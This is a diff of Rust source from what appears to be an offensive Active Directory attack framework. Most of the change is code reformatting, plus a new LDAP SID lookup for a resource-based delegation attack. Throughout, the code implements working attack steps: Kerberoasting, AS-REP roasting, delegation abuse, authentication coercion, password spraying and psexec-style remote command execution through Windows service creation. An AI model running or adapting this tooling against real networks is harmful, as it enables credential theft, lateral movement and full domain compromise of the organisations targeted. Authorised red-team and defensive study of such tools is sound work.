@@ -5,16 +5,19 @@
 //! overthrone-core, overthrone-hunter, overthrone-crawler, etc.
 
 use crate::goals::{
-    CompromisedCred, DelegationInfo, DiscoveredComputer, DiscoveredUser,
-    EngagementState, LootItem, SecretType,
+    CompromisedCred, DelegationInfo, DiscoveredComputer, DiscoveredUser, EngagementState, LootItem,
+    SecretType,
 };
 use crate::planner::{PlanStep, PlannedAction, StepResult};
 use chrono::Utc;
 use colored::Colorize;
+use hmac::{Hmac, Mac};
+use md4::{Digest as Md4Digest, Md4};
+use md5::Md5;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::{kerberos, ldap, smb::SmbSession};
-use overthrone_hunter::constrained::{ConstrainedConfig, ConstrainedResult};
 use overthrone_hunter::coerce::{CoerceConfig, CoerceMethod, CoerceResult};
+use overthrone_hunter::constrained::{ConstrainedConfig, ConstrainedResult};
 use overthrone_hunter::rbcd::{RbcdConfig, RbcdResult};
 use overthrone_hunter::unconstrained::{UnconstrainedConfig, UnconstrainedResult};
 use overthrone_hunter::{HuntConfig, TicketOps};
@@ -41,7 +44,6 @@ pub struct ExecContext {
     /// Override credentials (e.g., use a newly compromised account)
     pub override_creds: Option<(String, String, bool)>,
 }
-
 
 impl ExecContext {
     /// Get effective credentials (override if set)
@@ -90,7 +92,6 @@ impl ExecContext {
     }
 }
 
-
 // ═══════════════════════════════════════════════════════════
 // Main Dispatch
 // ═══════════════════════════════════════════════════════════
@@ -105,7 +106,13 @@ pub async fn execute_step(
 
     if ctx.dry_run {
         info!("{}", "  DRY RUN — skipping execution".dimmed());
-        state.log_action(&step.stage.to_string(), &step.description, "", true, "dry run");
+        state.log_action(
+            &step.stage.to_string(),
+            &step.description,
+            "",
+            true,
+            "dry run",
+        );
         return StepResult {
             success: true,
             output: "dry run".to_string(),
@@ -123,9 +130,7 @@ pub async fn execute_step(
         PlannedAction::EnumerateShares { target } => {
             exec_enumerate_shares(ctx, state, target).await
         }
-        PlannedAction::CheckAdminAccess { targets } => {
-            exec_check_admin(ctx, state, targets).await
-        }
+        PlannedAction::CheckAdminAccess { targets } => exec_check_admin(ctx, state, targets).await,
         PlannedAction::AsRepRoast { users } => exec_asrep_roast(ctx, state, users).await,
         PlannedAction::Kerberoast { spns } => exec_kerberoast(ctx, state, spns).await,
         PlannedAction::ConstrainedDelegation {
@@ -133,10 +138,9 @@ pub async fn execute_step(
             target_spn,
             impersonate,
         } => exec_constrained_delegation(ctx, state, account, target_spn, impersonate).await,
-        PlannedAction::RbcdAttack {
-            controlled,
-            target,
-        } => exec_rbcd(ctx, state, controlled, target).await,
+        PlannedAction::RbcdAttack { controlled, target } => {
+            exec_rbcd(ctx, state, controlled, target).await
+        }
         PlannedAction::UnconstrainedDelegation { target_host } => {
             exec_unconstrained_delegation(ctx, state, target_host).await
         }
@@ -146,9 +150,7 @@ pub async fn execute_step(
         PlannedAction::SmbExec { target, command } => {
             exec_smbexec(ctx, state, target, command).await
         }
-        PlannedAction::PsExec { target, command } => {
-            exec_psexec(ctx, state, target, command).await
-        }
+        PlannedAction::PsExec { target, command } => exec_psexec(ctx, state, target, command).await,
         PlannedAction::WmiExec { target, command } => {
             exec_wmiexec(ctx, state, target, command).await
         }
@@ -173,10 +175,9 @@ pub async fn execute_step(
         PlannedAction::ForgeGoldenTicket { krbtgt_hash } => {
             exec_golden_ticket(ctx, state, krbtgt_hash).await
         }
-        PlannedAction::ForgeSilverTicket {
-            service_hash,
-            spn,
-        } => exec_silver_ticket(ctx, state, service_hash, spn).await,
+        PlannedAction::ForgeSilverTicket { service_hash, spn } => {
+            exec_silver_ticket(ctx, state, service_hash, spn).await
+        }
         PlannedAction::CrackHashes { hashes } => exec_crack_hashes(ctx, state, hashes).await,
         PlannedAction::RunPlaybook { playbook_id } => {
             // Playbooks are expanded by the runner, not the executor
@@ -220,31 +221,42 @@ pub async fn execute_step(
     result
 }
 
-
 // ═══════════════════════════════════════════════════════════
 // Enumeration Executors
 // ═══════════════════════════════════════════════════════════
 
 async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
     let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps).await {
+    let mut conn = match ldap::LdapSession::connect(
+        &ctx.dc_ip,
+        &ctx.domain,
+        user,
+        pass,
+        ctx.use_ldaps,
+    )
+    .await
+    {
         Ok(c) => c,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("LDAP connect failed: {e}"),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("LDAP connect failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let ad_users = match conn.enumerate_users().await {
         Ok(u) => u,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("LDAP user enumeration failed: {e}"),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("LDAP user enumeration failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let _ = conn.disconnect().await;
@@ -275,27 +287,52 @@ async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) ->
     let admin_users = state.users.iter().filter(|u| u.admin_count).count();
     let msg = format!(
         "Enumerated {} users ({} admin, {} kerberoastable, {} AS-REP)",
-        user_count, admin_users, state.kerberoastable.len(), state.asrep_roastable.len()
+        user_count,
+        admin_users,
+        state.kerberoastable.len(),
+        state.asrep_roastable.len()
     );
     info!("{} {}", "  ✓".green(), msg);
-    StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
     let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps).await {
+    let mut conn = match ldap::LdapSession::connect(
+        &ctx.dc_ip,
+        &ctx.domain,
+        user,
+        pass,
+        ctx.use_ldaps,
+    )
+    .await
+    {
         Ok(c) => c,
-        Err(e) => return StepResult {
-            success: false, output: format!("LDAP: {e}"), new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("LDAP: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let ad_computers = match conn.enumerate_computers().await {
         Ok(c) => c,
-        Err(e) => return StepResult {
-            success: false, output: format!("Search: {e}"), new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("Search: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let _ = conn.disconnect().await;
@@ -312,8 +349,11 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
             }
         }
         if unconstrained {
-            state.unconstrained_delegation
-                .push(c.dns_hostname.clone().unwrap_or_else(|| c.sam_account_name.clone()));
+            state.unconstrained_delegation.push(
+                c.dns_hostname
+                    .clone()
+                    .unwrap_or_else(|| c.sam_account_name.clone()),
+            );
         }
 
         state.computers.push(DiscoveredComputer {
@@ -327,48 +367,91 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
 
     let msg = format!(
         "Enumerated {} computers ({} DCs, {} unconstrained)",
-        state.computers.len(), dc_count, state.unconstrained_delegation.len()
+        state.computers.len(),
+        dc_count,
+        state.unconstrained_delegation.len()
     );
     info!("{} {}", "  ✓".green(), msg);
-    StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 async fn exec_enumerate_groups(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
     let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps).await {
+    let mut conn = match ldap::LdapSession::connect(
+        &ctx.dc_ip,
+        &ctx.domain,
+        user,
+        pass,
+        ctx.use_ldaps,
+    )
+    .await
+    {
         Ok(c) => c,
-        Err(e) => return StepResult {
-            success: false, output: format!("{e}"), new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("{e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let ad_groups = match conn.enumerate_groups().await {
         Ok(g) => g,
-        Err(e) => return StepResult {
-            success: false, output: format!("{e}"), new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("{e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let _ = conn.disconnect().await;
 
     for g in &ad_groups {
-        state.groups.insert(g.sam_account_name.clone(), g.members.clone());
+        state
+            .groups
+            .insert(g.sam_account_name.clone(), g.members.clone());
     }
 
     let msg = format!("Enumerated {} groups", state.groups.len());
     info!("{} {}", "  ✓".green(), msg);
-    StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 async fn exec_enumerate_trusts(ctx: &ExecContext, _state: &mut EngagementState) -> StepResult {
     let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps).await {
+    let mut conn = match ldap::LdapSession::connect(
+        &ctx.dc_ip,
+        &ctx.domain,
+        user,
+        pass,
+        ctx.use_ldaps,
+    )
+    .await
+    {
         Ok(c) => c,
-        Err(e) => return StepResult {
-            success: false, output: format!("LDAP: {e}"), new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("LDAP: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let trusts = match conn.enumerate_trusts().await {
@@ -376,8 +459,10 @@ async fn exec_enumerate_trusts(ctx: &ExecContext, _state: &mut EngagementState) 
         Err(e) => {
             let _ = conn.disconnect().await;
             return StepResult {
-                success: false, output: format!("Trust enum failed: {e}"),
-                new_credentials: 0, new_admin_hosts: 0,
+                success: false,
+                output: format!("Trust enum failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
             };
         }
     };
@@ -386,28 +471,53 @@ async fn exec_enumerate_trusts(ctx: &ExecContext, _state: &mut EngagementState) 
 
     let mut trust_info = Vec::new();
     for t in &trusts {
-        info!("  {} {} ({}, {})",
-            "⤷".cyan(), t.trust_partner.bold(),
-            t.trust_direction, t.trust_type
+        info!(
+            "  {} {} ({}, {})",
+            "⤷".cyan(),
+            t.trust_partner.bold(),
+            t.trust_direction,
+            t.trust_type
         );
         trust_info.push(format!(
-            "{} ({}, {})", t.trust_partner, t.trust_direction, t.trust_type
+            "{} ({}, {})",
+            t.trust_partner, t.trust_direction, t.trust_type
         ));
     }
 
-    let msg = format!("Enumerated {} domain trusts: [{}]", trusts.len(), trust_info.join(", "));
+    let msg = format!(
+        "Enumerated {} domain trusts: [{}]",
+        trusts.len(),
+        trust_info.join(", ")
+    );
     info!("{} {}", "  ✓".green(), msg);
-    StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 async fn exec_enumerate_gpos(ctx: &ExecContext, _state: &mut EngagementState) -> StepResult {
     let (user, pass, _) = ctx.effective_creds();
-    let mut conn = match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps).await {
+    let mut conn = match ldap::LdapSession::connect(
+        &ctx.dc_ip,
+        &ctx.domain,
+        user,
+        pass,
+        ctx.use_ldaps,
+    )
+    .await
+    {
         Ok(c) => c,
-        Err(e) => return StepResult {
-            success: false, output: format!("LDAP: {e}"), new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("LDAP: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     // Query groupPolicyContainer objects
@@ -418,8 +528,10 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, _state: &mut EngagementState) ->
         Err(e) => {
             let _ = conn.disconnect().await;
             return StepResult {
-                success: false, output: format!("GPO enum failed: {e}"),
-                new_credentials: 0, new_admin_hosts: 0,
+                success: false,
+                output: format!("GPO enum failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
             };
         }
     };
@@ -429,7 +541,9 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, _state: &mut EngagementState) ->
     let mut gpo_names = Vec::new();
     for entry in &entries {
         if let Some(name) = entry.attrs.get("displayName").and_then(|v| v.first()) {
-            let sysvol = entry.attrs.get("gPCFileSysPath")
+            let sysvol = entry
+                .attrs
+                .get("gPCFileSysPath")
                 .and_then(|v| v.first())
                 .cloned()
                 .unwrap_or_default();
@@ -438,11 +552,19 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, _state: &mut EngagementState) ->
         }
     }
 
-    let msg = format!("Enumerated {} GPOs: [{}]", entries.len(), gpo_names.join(", "));
+    let msg = format!(
+        "Enumerated {} GPOs: [{}]",
+        entries.len(),
+        gpo_names.join(", ")
+    );
     info!("{} {}", "  ✓".green(), msg);
-    StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 async fn exec_enumerate_shares(
     ctx: &ExecContext,
@@ -455,10 +577,24 @@ async fn exec_enumerate_shares(
             let shares = smb
                 .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON"])
                 .await;
-            let readable: Vec<_> = shares.iter().filter(|s| s.readable).map(|s| &s.share_name).collect();
-            let msg = format!("Shares on {}: {} readable {:?}", target, readable.len(), readable);
+            let readable: Vec<_> = shares
+                .iter()
+                .filter(|s| s.readable)
+                .map(|s| &s.share_name)
+                .collect();
+            let msg = format!(
+                "Shares on {}: {} readable {:?}",
+                target,
+                readable.len(),
+                readable
+            );
             info!("{} {}", "  ✓".green(), msg);
-            StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+            StepResult {
+                success: true,
+                output: msg,
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            }
         }
         Err(e) => StepResult {
             success: false,
@@ -468,7 +604,6 @@ async fn exec_enumerate_shares(
         },
     }
 }
-
 
 async fn exec_check_admin(
     ctx: &ExecContext,
@@ -496,9 +631,13 @@ async fn exec_check_admin(
     }
 
     let msg = format!("Admin check: {} hosts accessible", state.admin_hosts.len());
-    StepResult { success: true, output: msg, new_credentials: 0, new_admin_hosts: new_admin }
+    StepResult {
+        success: true,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: new_admin,
+    }
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Kerberos Attack Executors
@@ -514,17 +653,23 @@ async fn exec_kerberoast(
     // Get TGT first
     let tgt = match kerberos::request_tgt(&ctx.dc_ip, &ctx.domain, user, pass, use_hash).await {
         Ok(t) => t,
-        Err(e) => return StepResult {
-            success: false, output: format!("TGT failed: {e}"),
-            new_credentials: 0, new_admin_hosts: 0
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("TGT failed: {e}"),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     let targets = state.kerberoastable.clone();
     if targets.is_empty() {
         return StepResult {
-            success: true, output: "No kerberoastable accounts found".to_string(),
-            new_credentials: 0, new_admin_hosts: 0
+            success: true,
+            output: "No kerberoastable accounts found".to_string(),
+            new_credentials: 0,
+            new_admin_hosts: 0,
         };
     }
 
@@ -543,10 +688,18 @@ async fn exec_kerberoast(
         ctx.jitter().await;
     }
 
-    let msg = format!("Kerberoast: {} hashes from {} targets", hash_count, targets.len());
-    StepResult { success: hash_count > 0, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    let msg = format!(
+        "Kerberoast: {} hashes from {} targets",
+        hash_count,
+        targets.len()
+    );
+    StepResult {
+        success: hash_count > 0,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 async fn exec_asrep_roast(
     ctx: &ExecContext,
@@ -556,8 +709,10 @@ async fn exec_asrep_roast(
     let targets = state.asrep_roastable.clone();
     if targets.is_empty() {
         return StepResult {
-            success: true, output: "No AS-REP roastable accounts".to_string(),
-            new_credentials: 0, new_admin_hosts: 0
+            success: true,
+            output: "No AS-REP roastable accounts".to_string(),
+            new_credentials: 0,
+            new_admin_hosts: 0,
         };
     }
 
@@ -575,10 +730,18 @@ async fn exec_asrep_roast(
         ctx.jitter().await;
     }
 
-    let msg = format!("AS-REP Roast: {} hashes from {} targets", hash_count, targets.len());
-    StepResult { success: hash_count > 0, output: msg, new_credentials: 0, new_admin_hosts: 0 }
+    let msg = format!(
+        "AS-REP Roast: {} hashes from {} targets",
+        hash_count,
+        targets.len()
+    );
+    StepResult {
+        success: hash_count > 0,
+        output: msg,
+        new_credentials: 0,
+        new_admin_hosts: 0,
+    }
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Delegation Attack Executors (wired to overthrone-hunter)
@@ -607,11 +770,15 @@ async fn exec_constrained_delegation(
             // Register delegation findings in state
             for acct in &result.delegatable_accounts {
                 state.constrained_delegation.push(DelegationInfo {
-                account: acct.sam_account_name.clone(),
-                delegation_type: if acct.protocol_transition { "constrained_t2a4d".to_string() } else { "constrained".to_string() },
-                targets: acct.allowed_to_delegate_to.clone(),
-                protocol_transition: acct.protocol_transition,
-            });
+                    account: acct.sam_account_name.clone(),
+                    delegation_type: if acct.protocol_transition {
+                        "constrained_t2a4d".to_string()
+                    } else {
+                        "constrained".to_string()
+                    },
+                    targets: acct.allowed_to_delegate_to.clone(),
+                    protocol_transition: acct.protocol_transition,
+                });
             }
 
             // If S4U succeeded, we effectively have admin on the target service
@@ -621,16 +788,21 @@ async fn exec_constrained_delegation(
                     if let Some(host) = chain.target_spn.split('/').nth(1) {
                         state.admin_hosts.insert(host.to_string());
                     }
-                    info!("  {} S4U chain: {} → {} as {}",
-                        "✓".green(), chain.source_account.bold(),
-                        chain.target_spn.cyan(), chain.impersonated_user.red()
+                    info!(
+                        "  {} S4U chain: {} → {} as {}",
+                        "✓".green(),
+                        chain.source_account.bold(),
+                        chain.target_spn.cyan(),
+                        chain.impersonated_user.red()
                     );
                 }
             }
 
             let msg = format!(
                 "Constrained delegation: {}/{} S4U chains succeeded ({} delegatable accounts)",
-                successful, result.s4u_chains.len(), result.delegatable_accounts.len()
+                successful,
+                result.s4u_chains.len(),
+                result.delegatable_accounts.len()
             );
             info!("{} {}", "  ✓".green(), msg);
             StepResult {
@@ -649,7 +821,6 @@ async fn exec_constrained_delegation(
     }
 }
 
-
 async fn exec_rbcd(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -660,10 +831,55 @@ async fn exec_rbcd(
 
     // Look up the controlled account's SID from state, or use a placeholder
     // In a real engagement, the SID would have been discovered during enumeration
-    let controlled_sid = state.users.iter()
-        .find(|u| u.sam_account_name == controlled)
-        .map(|_| "S-1-5-21-0-0-0-0".to_string()) // Placeholder — real SID from LDAP objectSid
-        .unwrap_or_else(|| "S-1-5-21-0-0-0-0".to_string());
+    // Resolve controlled account's SID from LDAP
+    let controlled_sid = {
+        let (user, pass, _) = ctx.effective_creds();
+        let mut conn =
+            match ldap::LdapSession::connect(&ctx.dc_ip, &ctx.domain, user, pass, ctx.use_ldaps)
+                .await
+            {
+                Ok(c) => c,
+                Err(e) => {
+                    return StepResult {
+                        success: false,
+                        output: format!("LDAP connect failed: {e}"),
+                        new_credentials: 0,
+                        new_admin_hosts: 0,
+                    };
+                }
+            };
+
+        let filter = format!(
+            "(sAMAccountName={})",
+            if controlled.ends_with('$') {
+                controlled.to_string()
+            } else {
+                format!("{}$", controlled)
+            }
+        );
+        let results = match conn.custom_search(&filter, &["objectSid"]).await {
+            Ok(r) => r,
+            Err(e) => {
+                return StepResult {
+                    success: false,
+                    output: format!("SID lookup failed: {e}"),
+                    new_credentials: 0,
+                    new_admin_hosts: 0,
+                };
+            }
+        };
+        let _ = conn.disconnect().await;
+
+        results
+            .first()
+            .and_then(|entry| entry.bin_attrs.get("objectSid"))
+            .and_then(|sids| sids.first())
+            .map(|bytes| parse_sid_bytes(bytes))
+            .unwrap_or_else(|| {
+                warn!("Could not resolve SID for {}, RBCD will fail", controlled);
+                "S-1-5-21-0-0-0-0".to_string()
+            })
+    };
 
     let rc = RbcdConfig {
         controlled_account: controlled.to_string(),
@@ -683,8 +899,11 @@ async fn exec_rbcd(
             if result.success {
                 state.admin_hosts.insert(target.to_string());
                 new_admin = 1;
-                info!("  {} RBCD: {} → {} (impersonating Administrator)",
-                    "✓".green(), controlled.bold(), target.red()
+                info!(
+                    "  {} RBCD: {} → {} (impersonating Administrator)",
+                    "✓".green(),
+                    controlled.bold(),
+                    target.red()
                 );
             }
 
@@ -692,7 +911,15 @@ async fn exec_rbcd(
                 "RBCD attack on {}: attr_written={}, s4u={}, cleanup={}",
                 target, result.attribute_written, result.s4u_success, result.cleaned_up
             );
-            info!("{} {}", if result.success { "  ✓".green() } else { "  ✗".red() }, msg);
+            info!(
+                "{} {}",
+                if result.success {
+                    "  ✓".green()
+                } else {
+                    "  ✗".red()
+                },
+                msg
+            );
             StepResult {
                 success: result.success,
                 output: msg,
@@ -708,7 +935,6 @@ async fn exec_rbcd(
         },
     }
 }
-
 
 async fn exec_unconstrained_delegation(
     ctx: &ExecContext,
@@ -727,21 +953,30 @@ async fn exec_unconstrained_delegation(
             // Update state with discovered unconstrained delegation hosts
             for host in &result.vulnerable_hosts {
                 if !state.unconstrained_delegation.contains(
-                    &host.dns_hostname.clone().unwrap_or(host.sam_account_name.clone())
+                    &host
+                        .dns_hostname
+                        .clone()
+                        .unwrap_or(host.sam_account_name.clone()),
                 ) {
                     state.unconstrained_delegation.push(
-                        host.dns_hostname.clone().unwrap_or(host.sam_account_name.clone())
+                        host.dns_hostname
+                            .clone()
+                            .unwrap_or(host.sam_account_name.clone()),
                     );
                 }
             }
 
-            let reachable = result.vulnerable_hosts.iter()
+            let reachable = result
+                .vulnerable_hosts
+                .iter()
                 .filter(|h| h.is_reachable == Some(true))
                 .count();
 
             let msg = format!(
                 "Unconstrained delegation: {} vulnerable hosts ({} reachable), {} DCs",
-                result.vulnerable_hosts.len(), reachable, result.domain_controllers.len()
+                result.vulnerable_hosts.len(),
+                reachable,
+                result.domain_controllers.len()
             );
             info!("{} {}", "  ✓".green(), msg);
             StepResult {
@@ -759,7 +994,6 @@ async fn exec_unconstrained_delegation(
         },
     }
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Coercion Executor (wired to overthrone-hunter)
@@ -788,8 +1022,11 @@ async fn exec_coerce(
         Ok(result) => {
             let success_count = result.successful_coercions.len();
             for coercion in &result.successful_coercions {
-                info!("  {} Coercion triggered: {} via {}",
-                    "✓".green(), target.bold(), coercion.method.cyan()
+                info!(
+                    "  {} Coercion triggered: {} via {}",
+                    "✓".green(),
+                    target.bold(),
+                    coercion.method.cyan()
                 );
             }
 
@@ -812,7 +1049,6 @@ async fn exec_coerce(
         },
     }
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Password Spray
@@ -855,24 +1091,49 @@ async fn exec_password_spray(
     }
 }
 
-
 // ═══════════════════════════════════════════════════════════
 // Remote Execution (svcctl via SMB named pipe)
 // ═══════════════════════════════════════════════════════════
 
-async fn exec_smbexec(ctx: &ExecContext, state: &mut EngagementState, target: &str, cmd: &str) -> StepResult {
+async fn exec_smbexec(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+    cmd: &str,
+) -> StepResult {
     exec_remote(ctx, state, target, cmd, "smbexec").await
 }
-async fn exec_psexec(ctx: &ExecContext, state: &mut EngagementState, target: &str, cmd: &str) -> StepResult {
+async fn exec_psexec(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+    cmd: &str,
+) -> StepResult {
     exec_remote(ctx, state, target, cmd, "psexec").await
 }
-async fn exec_wmiexec(ctx: &ExecContext, state: &mut EngagementState, target: &str, cmd: &str) -> StepResult {
+async fn exec_wmiexec(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+    cmd: &str,
+) -> StepResult {
     exec_remote(ctx, state, target, cmd, "wmiexec").await
 }
-async fn exec_winrmexec(ctx: &ExecContext, state: &mut EngagementState, target: &str, cmd: &str) -> StepResult {
+async fn exec_winrmexec(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+    cmd: &str,
+) -> StepResult {
     exec_remote(ctx, state, target, cmd, "winrm").await
 }
-async fn exec_generic(ctx: &ExecContext, state: &mut EngagementState, target: &str, cmd: &str, method: &str) -> StepResult {
+async fn exec_generic(
+    ctx: &ExecContext,
+    state: &mut EngagementState,
+    target: &str,
+    cmd: &str,
+    method: &str,
+) -> StepResult {
     exec_remote(ctx, state, target, cmd, method).await
 }
 
@@ -884,17 +1145,24 @@ async fn exec_remote(
     command: &str,
     method: &str,
 ) -> StepResult {
-    info!("  {} → {} via {}", target.bold(), command.yellow(), method.cyan());
+    info!(
+        "  {} → {} via {}",
+        target.bold(),
+        command.yellow(),
+        method.cyan()
+    );
     let (user, pass, _) = ctx.effective_creds();
 
     let smb = match SmbSession::connect(target, &ctx.domain, user, pass).await {
         Ok(s) => s,
-        Err(e) => return StepResult {
-            success: false,
-            output: format!("SMB connect to {}: {e}", target),
-            new_credentials: 0,
-            new_admin_hosts: 0,
-        },
+        Err(e) => {
+            return StepResult {
+                success: false,
+                output: format!("SMB connect to {}: {e}", target),
+                new_credentials: 0,
+                new_admin_hosts: 0,
+            };
+        }
     };
 
     // Build service command that writes output to a temp file
@@ -919,12 +1187,24 @@ async fn exec_remote(
 
             // Cleanup — delete service & output file
             let _ = delete_service(&smb, &svc_name).await;
-            let _ = smb.delete_file("ADMIN$", &format!("Temp\\{}.tmp", &output_file[3..11])).await;
+            let _ = smb
+                .delete_file("ADMIN$", &format!("Temp\\{}.tmp", &output_file[3..11]))
+                .await;
 
             state.admin_hosts.insert(target.to_string());
-            let msg = format!("Executed on {} via {}: {} bytes output", target, method, output.len());
+            let msg = format!(
+                "Executed on {} via {}: {} bytes output",
+                target,
+                method,
+                output.len()
+            );
             info!("{} {}", "  ✓".green(), msg);
-            StepResult { success: true, output, new_credentials: 0, new_admin_hosts: 1 }
+            StepResult {
+                success: true,
+                output,
+                new_credentials: 0,
+                new_admin_hosts: 1,
+            }
         }
         Err(e) => StepResult {
             success: false,
@@ -935,10 +1215,12 @@ async fn exec_remote(
     }
 }
 
-
 /// Create and start a Windows service via svcctl named pipe
 async fn create_and_start_service(smb: &SmbSession, name: &str, bin_path: &str) -> Result<()> {
-    info!("{}", format!("  Creating service {name} → {bin_path}").dimmed());
+    info!(
+        "{}",
+        format!("  Creating service {name} → {bin_path}").dimmed()
+    );
 
     // Step 1: RPC Bind to SVCCTL
     let bind_request = build_svcctl_bind();
@@ -987,7 +1269,6 @@ async fn create_and_start_service(smb: &SmbSession, name: &str, bin_path: &str) 
     Ok(())
 }
 
-
 /// Delete a Windows service via svcctl
 async fn delete_service(smb: &SmbSession, name: &str) -> Result<()> {
     info!("{}", format!("  Deleting service {name}").dimmed());
@@ -1003,20 +1284,20 @@ async fn delete_service(smb: &SmbSession, name: &str) -> Result<()> {
         let scm_handle = &scm_resp[24..44];
         let open_svc = build_open_service_request(scm_handle, name);
         if let Ok(svc_resp) = smb.pipe_transact("svcctl", &open_svc).await
-            && svc_resp.len() >= 48 {
-                let svc_handle = &svc_resp[24..44];
-                let delete_req = build_delete_service_request(svc_handle);
-                let _ = smb.pipe_transact("svcctl", &delete_req).await;
-                let close_req = build_close_handle_request(svc_handle);
-                let _ = smb.pipe_transact("svcctl", &close_req).await;
-            }
+            && svc_resp.len() >= 48
+        {
+            let svc_handle = &svc_resp[24..44];
+            let delete_req = build_delete_service_request(svc_handle);
+            let _ = smb.pipe_transact("svcctl", &delete_req).await;
+            let close_req = build_close_handle_request(svc_handle);
+            let _ = smb.pipe_transact("svcctl", &close_req).await;
+        }
         let close_scm = build_close_handle_request(scm_handle);
         let _ = smb.pipe_transact("svcctl", &close_scm).await;
     }
 
     Ok(())
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // SVCCTL NDR Request Builders
@@ -1026,34 +1307,34 @@ async fn delete_service(smb: &SmbSession, name: &str) -> Result<()> {
 fn build_svcctl_bind() -> Vec<u8> {
     // SVCCTL UUID: 367abb81-9844-35f1-ad32-98f038001003
     let uuid: [u8; 16] = [
-        0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35,
-        0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03,
+        0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10,
+        0x03,
     ];
 
     let mut buf = Vec::new();
-    buf.extend_from_slice(&[5, 0, 11, 3]);         // version, type=bind, flags
-    buf.extend_from_slice(&[0x10, 0, 0, 0]);       // data representation
